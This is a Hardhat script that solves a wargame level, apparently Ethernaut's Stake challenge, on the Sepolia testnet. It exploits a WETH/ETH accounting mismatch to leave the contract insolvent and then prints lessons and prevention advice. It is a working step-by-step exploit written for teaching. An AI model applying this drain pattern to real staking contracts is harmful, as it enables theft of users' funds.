import { ethers } from "hardhat";

/**
 * Execute the Stake attack by exploiting WETH/ETH accounting mismatch
 * 
 * Usage:
 * ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress TARGET_ADDRESS=0xStakeAddress npx hardhat run scripts/level-31-stake/attack.ts --network sepolia
 * 
 * Or use direct attack:
 * TARGET_ADDRESS=0xStakeAddress npx hardhat run scripts/level-31-stake/attack.ts --network sepolia
 */
async function main() {
  console.log("Executing Stake attack with WETH/ETH accounting mismatch...\n");
  
  // Get the addresses from environment
  const attackContractAddress = process.env.ATTACK_CONTRACT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the Stake contract
    const stakeContract = await ethers.getContractAt("Stake", targetAddress);
    const wethAddress = await stakeContract.WETH();
    const wethContract = await ethers.getContractAt("WETH", wethAddress);
    
    console.log("=== Contract Addresses ===");
    console.log(`Stake: ${targetAddress}`);
    console.log(`WETH: ${wethAddress}`);
    if (attackContractAddress) {
      console.log(`Attack Contract: ${attackContractAddress}`);
    }
    
    // Check initial state
    let totalStaked = await stakeContract.totalStaked();
    let contractBalance = await ethers.provider.getBalance(targetAddress);
    let userStake = await stakeContract.UserStake(signer.address);
    let isStaker = await stakeContract.Stakers(signer.address);
    
    console.log("\n=== Initial State ===");
    console.log(`Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
    console.log(`Contract ETH Balance: ${ethers.formatEther(contractBalance)} ETH`);
    console.log(`Your Stake: ${ethers.formatEther(userStake)} ETH`);
    console.log(`Are You a Staker: ${isStaker}`);
    
    console.log("\n=== Win Conditions ===");
    console.log("1. Contract ETH balance > 0");
    console.log("2. totalStaked > Contract ETH balance");
    console.log("3. You are a staker");
    console.log("4. Your staked balance = 0");
    
    // Check if already won
    const alreadyWon = (
      contractBalance > 0n &&
      totalStaked > contractBalance &&
      isStaker &&
      userStake === 0n
    );
    
    if (alreadyWon) {
      console.log("\n✅ All conditions already met! Level passed!");
      return;
    }
    
    // Method 1: Use attack contract if available
    if (attackContractAddress) {
      console.log("\n=== Method 1: Using Attack Contract ===");
      const attackContract = await ethers.getContractAt("StakeAttack", attackContractAddress);
      
      // Check state through attack contract
      const state = await attackContract.checkState();
      console.log(`\nAttack Contract State:`);
      console.log(`  Contract Balance: ${ethers.formatEther(state.contractBalance)} ETH`);
      console.log(`  Total Staked: ${ethers.formatEther(state.totalStaked)} ETH`);
      console.log(`  Is Staker: ${state.isStaker}`);
      console.log(`  User Stake: ${ethers.formatEther(state.userStake)} ETH`);
      console.log(`  Meets Conditions: ${state.meetsConditions}`);
      
      if (state.meetsConditions) {
        console.log("\n✓ Attack contract already meets all conditions!");
        return;
      }
      
      console.log("\nCalling attack() with 0.003 ETH...");
      const tx = await attackContract.attack({value: ethers.parseEther("0.003")});
      console.log("Transaction hash:", tx.hash);
      console.log("Waiting for confirmation...");
      await tx.wait();
      console.log("✓ Transaction confirmed");
      
    } else {
      // Method 2: Direct manipulation
      console.log("\n=== Method 2: Direct Attack ===");
      console.log("Executing step-by-step attack...\n");
      
      const minStake = ethers.parseEther("0.001") + 1n;
      
      // Step 1: Get WETH
      console.log("📤 Step 1: Getting WETH tokens...");
      console.log(`  Depositing ${ethers.formatEther(minStake)} ETH to WETH contract`);
      
      const depositTx = await wethContract.deposit({value: minStake});
      console.log(`  Transaction hash: ${depositTx.hash}`);
      await depositTx.wait();
      console.log("  ✓ WETH received");
      
      let wethBalance = await wethContract.balanceOf(signer.address);
      console.log(`  Your WETH balance: ${ethers.formatEther(wethBalance)} WETH`);
      
      // Step 2: Approve Stake contract
      console.log("\n📤 Step 2: Approving Stake contract to spend WETH...");
      const approveTx = await wethContract.approve(targetAddress, minStake);
      console.log(`  Transaction hash: ${approveTx.hash}`);
      await approveTx.wait();
      console.log("  ✓ Approval confirmed");
      
      // Step 3: Stake WETH
      console.log("\n📤 Step 3: Staking WETH...");
      console.log(`  Amount: ${ethers.formatEther(minStake)} WETH`);
      console.log("  ⚠️  This increases totalStaked but NOT the ETH balance!");
      
      const stakeWethTx = await stakeContract.StakeWETH(minStake);
      console.log(`  Transaction hash: ${stakeWethTx.hash}`);
      await stakeWethTx.wait();
      console.log("  ✓ WETH staked");
      
      // Check state after WETH stake
      totalStaked = await stakeContract.totalStaked();
      contractBalance = await ethers.provider.getBalance(targetAddress);
      userStake = await stakeContract.UserStake(signer.address);
      
      console.log("\n  State after staking WETH:");
      console.log(`  - Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
      console.log(`  - Contract Balance: ${ethers.formatEther(contractBalance)} ETH (unchanged!)`);
      console.log(`  - Your Stake: ${ethers.formatEther(userStake)} ETH`);
      
      // Step 4: Stake ETH
      console.log("\n📤 Step 4: Staking ETH...");
      console.log(`  Amount: ${ethers.formatEther(minStake)} ETH`);
      console.log("  This ensures contract has ETH balance > 0");
      
      const stakeEthTx = await stakeContract.StakeETH({value: minStake});
      console.log(`  Transaction hash: ${stakeEthTx.hash}`);
      await stakeEthTx.wait();
      console.log("  ✓ ETH staked");
      
      // Check state after ETH stake
      totalStaked = await stakeContract.totalStaked();
      contractBalance = await ethers.provider.getBalance(targetAddress);
      userStake = await stakeContract.UserStake(signer.address);
      
      console.log("\n  State after staking ETH:");
      console.log(`  - Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
      console.log(`  - Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);
      console.log(`  - Your Stake: ${ethers.formatEther(userStake)} ETH`);
      
      // Step 5: Unstake to create mismatch
      console.log("\n📤 Step 5: Unstaking to create accounting mismatch...");
      console.log(`  Unstaking ${ethers.formatEther(minStake)} ETH (partial)`);
      console.log("  ⚠️  This sends ETH, creating the mismatch!");
      
      const unstakeTx1 = await stakeContract.Unstake(minStake);
      console.log(`  Transaction hash: ${unstakeTx1.hash}`);
      await unstakeTx1.wait();
      console.log("  ✓ First unstake complete");
      
      // Check state
      totalStaked = await stakeContract.totalStaked();
      contractBalance = await ethers.provider.getBalance(targetAddress);
      userStake = await stakeContract.UserStake(signer.address);
      
      console.log("\n  State after first unstake:");
      console.log(`  - Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
      console.log(`  - Contract Balance: ${ethers.formatEther(contractBalance)} ETH`);
      console.log(`  - Your Stake: ${ethers.formatEther(userStake)} ETH`);
      console.log(`  - Mismatch: ${totalStaked > contractBalance ? "YES ✓" : "NO ✗"}`);
      
      // Step 6: Unstake remaining to zero out your stake
      if (userStake > 0n) {
        console.log("\n📤 Step 6: Unstaking remaining balance...");
        console.log(`  Unstaking ${ethers.formatEther(userStake)} ETH (remaining)`);
        
        const unstakeTx2 = await stakeContract.Unstake(userStake);
        console.log(`  Transaction hash: ${unstakeTx2.hash}`);
        await unstakeTx2.wait();
        console.log("  ✓ Second unstake complete");
      }
    }
    
    // Check final state
    totalStaked = await stakeContract.totalStaked();
    contractBalance = await ethers.provider.getBalance(targetAddress);
    userStake = await stakeContract.UserStake(signer.address);
    isStaker = await stakeContract.Stakers(signer.address);
    
    console.log("\n=== Final State ===");
    console.log(`Total Staked: ${ethers.formatEther(totalStaked)} ETH`);
    console.log(`Contract ETH Balance: ${ethers.formatEther(contractBalance)} ETH`);
    console.log(`Your Stake: ${ethers.formatEther(userStake)} ETH`);
    console.log(`Are You a Staker: ${isStaker}`);
    
    console.log("\n=== Checking Win Conditions ===");
    const cond1 = contractBalance > 0n;
    const cond2 = totalStaked > contractBalance;
    const cond3 = isStaker;
    const cond4 = userStake === 0n;
    
    console.log(`1. Contract ETH balance > 0: ${cond1 ? "✅" : "❌"} (${ethers.formatEther(contractBalance)} ETH)`);
    console.log(`2. totalStaked > balance: ${cond2 ? "✅" : "❌"} (${ethers.formatEther(totalStaked)} > ${ethers.formatEther(contractBalance)})`);
    console.log(`3. You are a staker: ${cond3 ? "✅" : "❌"}`);
    console.log(`4. Your stake = 0: ${cond4 ? "✅" : "❌"} (${ethers.formatEther(userStake)} ETH)`);
    
    const allConditionsMet = cond1 && cond2 && cond3 && cond4;
    
    if (allConditionsMet) {
      console.log("\n🎉 SUCCESS! All conditions met!");
      console.log("✅ You've successfully exploited the WETH/ETH accounting mismatch!");
      
      console.log("\n📚 What we learned:");
      
      console.log("\n1. ASSET TYPE TRACKING:");
      console.log("   - Contract accepts both native ETH and ERC20 WETH");
      console.log("   - totalStaked tracks BOTH types together");
      console.log("   - But contract's ETH balance only includes native ETH");
      console.log("   - No separate accounting for different asset types");
      
      console.log("\n2. WITHDRAWAL MISMATCH:");
      console.log("   - StakeWETH: Receives WETH tokens (ERC20)");
      console.log("   - Unstake: Sends native ETH (not WETH!)");
      console.log("   - No check for which asset type was staked");
      console.log("   - User can stake WETH, then withdraw ETH");
      
      console.log("\n3. ACCOUNTING VULNERABILITY:");
      console.log("   Before attack:");
      console.log("   - totalStaked = initial deployment amount");
      console.log("   - ETH balance = initial deployment amount");
      console.log("   - Accounting balanced ✓");
      console.log("");
      console.log("   After staking WETH:");
      console.log("   - totalStaked increases by WETH amount");
      console.log("   - ETH balance unchanged");
      console.log("   - Accounting IMBALANCED ⚠️");
      console.log("");
      console.log("   After unstaking:");
      console.log("   - ETH is drained from contract");
      console.log("   - totalStaked > ETH balance");
      console.log("   - Contract becomes insolvent!");
      
      console.log("\n4. EQUIVALENT VALUE ASSUMPTION:");
      console.log("   - Contract assumes 1 WETH = 1 ETH value");
      console.log("   - While true economically, they're different assets");
      console.log("   - WETH = ERC20 token on the blockchain");
      console.log("   - ETH = native blockchain currency");
      console.log("   - Can't substitute one for the other in accounting!");
      
      console.log("\n5. EXTERNAL CALL RISKS:");
      console.log("   - Contract uses low-level call for WETH interaction");
      console.log("   - WETH.call(abi.encodeWithSelector(...))");
      console.log("   - Doesn't properly validate return values");
      console.log("   - Should use proper interface and check returns");
      
      console.log("\n🔒 How to Prevent This:");
      
      console.log("\n1. Separate Accounting:");
      console.log("   ```solidity");
      console.log("   uint256 public totalStakedETH;");
      console.log("   uint256 public totalStakedWETH;");
      console.log("   mapping(address => uint256) public userStakeETH;");
      console.log("   mapping(address => uint256) public userStakeWETH;");
      console.log("   ```");
      
      console.log("\n2. Track Asset Type:");
      console.log("   ```solidity");
      console.log("   enum AssetType { ETH, WETH }");
      console.log("   mapping(address => AssetType) public stakedAssetType;");
      console.log("   ");
      console.log("   function Unstake(uint256 amount) public {");
      console.log("       if (stakedAssetType[msg.sender] == AssetType.ETH) {");
      console.log("           // Send ETH");
      console.log("       } else {");
      console.log("           // Transfer WETH");
      console.log("       }");
      console.log("   }");
      console.log("   ```");
      
      console.log("\n3. Don't Mix Asset Types:");
      console.log("   ```solidity");
      console.log("   // BAD: Allow mixing");
      console.log("   function StakeETH() public payable { ... }");
      console.log("   function StakeWETH(uint256) public { ... }");
      console.log("   function Unstake(uint256) public { ... } // Which asset?");
      console.log("   ");
      console.log("   // GOOD: Separate functions for each asset");
      console.log("   function stakeETH() public payable { ... }");
      console.log("   function unstakeETH(uint256) public { ... }");
      console.log("   function stakeWETH(uint256) public { ... }");
      console.log("   function unstakeWETH(uint256) public { ... }");
      console.log("   ```");
      
      console.log("\n4. Validate Contract Solvency:");
      console.log("   ```solidity");
      console.log("   function Unstake(uint256 amount) public {");
      console.log("       require(address(this).balance >= amount, \"Insufficient ETH\");");
      console.log("       // ... proceed with withdrawal");
      console.log("   }");
      console.log("   ```");
      
      console.log("\n5. Use Proper Interfaces:");
      console.log("   ```solidity");
      console.log("   // BAD: Low-level call");
      console.log("   (bool success,) = WETH.call(abi.encodeWithSelector(...));");
      console.log("   ");
      console.log("   // GOOD: Use interface");
      console.log("   IERC20 wethToken = IERC20(WETH);");
      console.log("   bool success = wethToken.transferFrom(msg.sender, address(this), amount);");
      console.log("   require(success, \"Transfer failed\");");
      console.log("   ```");
      
      console.log("\n6. Comprehensive Testing:");
      console.log("   - Test mixed staking scenarios");
      console.log("   - Verify accounting after each operation");
      console.log("   - Check that totalStaked <= actual balances");
      console.log("   - Test withdrawal of each asset type");
      console.log("   - Ensure contract can't become insolvent");
      
    } else {
      console.log("\n❌ Attack incomplete! Not all conditions met.");
      console.log("\nPossible issues:");
      if (!cond1) console.log("- Contract has no ETH balance");
      if (!cond2) console.log("- totalStaked is not greater than balance");
      if (!cond3) console.log("- You are not registered as a staker");
      if (!cond4) console.log("- Your stake is not zero yet");
      
      console.log("\nTroubleshooting:");
      console.log("1. Make sure you have enough ETH for gas + staking");
      console.log("2. Ensure WETH contract is deployed and has deposit function");
      console.log("3. Check that approval was successful");
      console.log("4. Verify stake amounts are above minimum (0.001 ETH)");
      console.log("5. Try unstaking in smaller increments");
    }
    
  } catch (error: any) {
    console.error("\n❌ Error executing attack:");
    if (error.message) {
      console.error("Error message:", error.message);
    }
    if (error.reason) {
      console.error("Reason:", error.reason);
    }
    if (error.data) {
      console.error("Error data:", error.data);
    }
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
